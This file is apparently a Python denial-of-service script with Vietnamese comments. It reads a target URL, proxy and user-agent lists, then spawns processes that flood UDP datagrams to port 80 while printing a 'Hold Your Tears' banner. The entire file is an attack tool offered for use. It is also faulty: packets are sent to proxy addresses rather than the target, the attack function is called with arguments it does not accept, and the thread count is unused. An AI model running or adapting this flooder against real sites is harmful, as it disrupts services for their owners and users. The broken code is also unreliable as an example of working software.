import concurrent.futures
import random
import socket
import string
import sys
import threading
import time

# Lấy URL từ đối số dòng lệnh
url = sys.argv[1]
port = 80

# Lấy số tiến trình và số luồng từ đối số dòng lệnh
num_processes = int(sys.argv[2])
num_threads = int(sys.argv[3])

# Tính tổng số yêu cầu dựa trên số tiến trình và số luồng
num_requests = num_processes * num_threads

# Đọc danh sách proxy từ file proxy.txt
with open("proxy.txt", "r") as file:
    proxies = file.readlines()

# Đọc danh sách user-agent từ file ua.txt
with open("ua.txt", "r") as file:
    user_agents = file.readlines()

# Chuyển đổi URL sang IP
try:
    host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("LỖI\n Hãy đảm bảo bạn đã nhập đúng địa chỉ website")
    sys.exit(2)

# Tạo biến chia sẻ cho số luồng
thread_num = 0
thread_num_mutex = threading.Lock()

# Hiển thị trạng thái luồng
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    # In kết quả trên cùng một dòng
    sys.stdout.write(f"\r {time.ctime().split()[3]} [{str(thread_num)}] #-#-# Hold Your Tears #-#-#")
    sys.stdout.flush()
    thread_num_mutex.release()

# Tạo URL Path ngẫu nhiên
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

# Thực hiện yêu cầu UDP
def attack():
    print_status()
    url_path = generate_url_path()

    # Chọn proxy và user-agent ngẫu nhiên
    proxy = random.choice(proxies).strip()
    user_agent = random.choice(user_agents).strip()

    # Tạo socket raw dùng giao thức UDP
    dos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Gửi gói tin đến địa chỉ IP và cổng mục tiêu
        dos.sendto(url_path.encode(), (proxy, port))
    except socket.error:
        print(f"\n [ Không thể gửi yêu cầu, máy chủ có thể đã tắt ]: {str(socket.error)}")
    finally:
        dos.close()

if __name__ == "__main__":
    # Các dòng mã khác
    
    # Sử dụng context manager của concurrent.futures.ProcessPoolExecutor để tạo và quản lý tiến trình một cách tự động
    with concurrent.futures.ProcessPoolExecutor(max_workers=num_processes) as executor:
        # Sử dụng hàm executor.map để thực thi hàm attack trong mỗi tiến trình
        executor.map(attack, range(num_processes))